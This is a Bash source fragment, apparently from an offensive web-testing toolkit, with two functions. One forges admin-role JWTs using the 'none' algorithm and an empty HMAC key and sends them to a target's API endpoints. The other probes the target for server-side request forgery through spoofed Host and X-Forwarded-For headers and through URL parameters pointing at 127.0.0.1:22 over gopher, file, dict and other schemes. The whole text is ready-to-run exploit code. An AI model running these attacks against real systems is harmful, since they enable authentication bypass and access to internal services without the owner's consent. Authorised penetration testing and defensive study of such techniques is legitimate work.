rt_216_jwt_none_alg_bypass() {
    local target="${1:-$TARGET}"
    _section "[RT-216] JWT NONE ALGORITHM BYPASS"
    run "Testing JWT tokens for algorithm confusion attacks..."
    > "$SESSION/rt/jwt_bypass.txt"
    local endpoints=$(grep -oP 'https?://[^"'\''\s]+' "$SESSION/rt/js_analysis.txt" 2>/dev/null | grep -i 'api\|auth\|login\|token\|admin' | head -10)
    [ -z "$endpoints" ] && endpoints="https://${target}/api"
    for api in $endpoints; do
        # Generate JWT with "alg":"none"
        local header='{"alg":"none","typ":"JWT"}'
        local payload='{"user":"admin","role":"admin","iat":'$(date +%s)'}'
        local h64=$(echo -n "$header" | base64 | tr '+/' '-_' | tr -d '=')
        local p64=$(echo -n "$payload" | base64 | tr '+/' '-_' | tr -d '=')
        local jwt="${h64}.${p64}."
        local resp=$(curl -sk --max-time 8 -H "Authorization: Bearer ${jwt}" "$api" 2>/dev/null)
        echo "$resp" | grep -qvi 'unauthorized\|invalid\|error' && [ -n "$resp" ] && {
            echo "JWT BYPASS: ${api} with alg=none" >> "$SESSION/rt/jwt_bypass.txt"
            echo "TOKEN: ${jwt:0:50}..." >> "$SESSION/rt/jwt_bypass.txt"
            echo "RESPONSE: ${resp:0:200}" >> "$SESSION/rt/jwt_bypass.txt"
            rt "JWT NONE bypass at ${api}!"
        }
        # Try alg=HS256 with empty key
        local header2='{"alg":"HS256","typ":"JWT"}'
        local h64_2=$(echo -n "$header2" | base64 | tr '+/' '-_' | tr -d '=')
        local jwt2="${h64_2}.${p64}.$(echo -n "${h64_2}.${p64}" | openssl dgst -sha256 -hmac '' -binary 2>/dev/null | base64 | tr '+/' '-_' | tr -d '=')"
        local resp2=$(curl -sk --max-time 8 -H "Authorization: Bearer ${jwt2}" "$api" 2>/dev/null)
        echo "$resp2" | grep -qvi 'unauthorized\|invalid\|error' && [ -n "$resp2" ] && {
            echo "JWT HMAC: ${api} with empty HMAC key" >> "$SESSION/rt/jwt_bypass.txt"
            rt "JWT empty HMAC bypass at ${api}!"
        }
    done
    [ -s "$SESSION/rt/jwt_bypass.txt" ] && rt "JWT bypass tests complete" || info "JWT bypass not found"
}

rt_217_ssrf_multi_vector() {
    local target="${1:-$TARGET}"
    _section "[RT-217] SSRF MULTI-VECTOR EXPLOITATION"
    run "Testing SSRF via multiple vectors: Host, X-Forwarded, URL params..."
    > "$SESSION/rt/ssrf_exploit.txt"
    local origin_ip=$(dig +short "${target}" A 2>/dev/null | head -1)
    # Test Host header SSRF
    for internal in "127.0.0.1" "localhost" "0.0.0.0" "[::1]" "[::ffff:127.0.0.1]"; do
        local status=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 -H "Host: ${internal}" "https://${target}/" 2>/dev/null)
        [ "$status" != "403" ] && [ "$status" != "000" ] && [ "$status" != "301" ] && [ "$status" != "302" ] && {
            echo "SSRF HOST: Host:${internal} -> HTTP ${status}" >> "$SESSION/rt/ssrf_exploit.txt"
            rt "SSRF via Host header: ${internal}"
        }
    done
    # Test X-Forwarded-For based SSRF
    for internal in "127.0.0.1" "10.0.0.1" "172.17.0.1" "192.168.1.1"; do
        local resp=$(curl -sk --max-time 6 -H "X-Forwarded-For: ${internal}" -H "X-Real-IP: ${internal}" -H "X-Client-IP: ${internal}" "https://${target}/" 2>/dev/null)
        echo "$resp" | grep -qi 'internal\|localhost\|127\.0\.0\|admin\|dashboard' && {
            echo "SSRF XFF: X-Forwarded-For:${internal} triggered internal content" >> "$SESSION/rt/ssrf_exploit.txt"
            rt "SSRF via X-Forwarded-For: ${internal}"
        }
    done
    # Test URL parameter SSRF
    for param in "url" "redirect" "next" "callback" "target" "link" "host" "ip" "server" "address" "endpoint" "api" "proxy" "uri" "source" "dest" "destination"; do
        for protocol in "http" "https" "ftp" "file" "dict" "gopher" "ldap"; do
            local status=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 4 "https://${target}/?${param}=${protocol}://127.0.0.1:22/" 2>/dev/null)
            [ "$status" != "403" ] && [ "$status" != "404" ] && [ "$status" != "000" ] && {
                echo "SSRF URL: ?${param}=${protocol}://127.0.0.1:22 -> HTTP ${status}" >> "$SESSION/rt/ssrf_exploit.txt"
                rt "SSRF via URL param: ${param} with ${protocol}"
            }
        done
    done
    [ -s "$SESSION/rt/ssrf_exploit.txt" ] && rt "SSRF multi-vector complete" || info "No SSRF vectors found"
}

